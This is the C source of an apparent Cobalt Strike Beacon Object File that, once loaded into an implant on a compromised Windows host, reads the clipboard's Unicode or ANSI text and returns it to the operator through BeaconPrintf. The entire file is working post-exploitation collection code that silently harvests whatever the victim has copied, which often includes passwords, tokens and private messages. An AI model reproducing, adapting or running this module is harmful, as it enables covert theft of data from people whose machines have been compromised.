/*
 * clipboard - dump current clipboard text.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    (void)args; (void)alen;

    if (!USER32$OpenClipboard(NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenClipboard failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    if (USER32$IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE h = USER32$GetClipboardData(CF_UNICODETEXT);
        if (h) {
            wchar_t *w = (wchar_t *)KERNEL32$GlobalLock(h);
            if (w) {
                char buf[4096];
                bof_w2a(w, buf, sizeof(buf));
                BeaconPrintf(CALLBACK_OUTPUT, "[UNICODE]\n%s\n", buf);
                KERNEL32$GlobalUnlock(h);
            }
        }
    } else if (USER32$IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE h = USER32$GetClipboardData(CF_TEXT);
        if (h) {
            char *s = (char *)KERNEL32$GlobalLock(h);
            if (s) {
                BeaconPrintf(CALLBACK_OUTPUT, "[ANSI]\n%.4095s\n", s);
                KERNEL32$GlobalUnlock(h);
            }
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "clipboard has no text\n");
    }

    USER32$CloseClipboard();
}
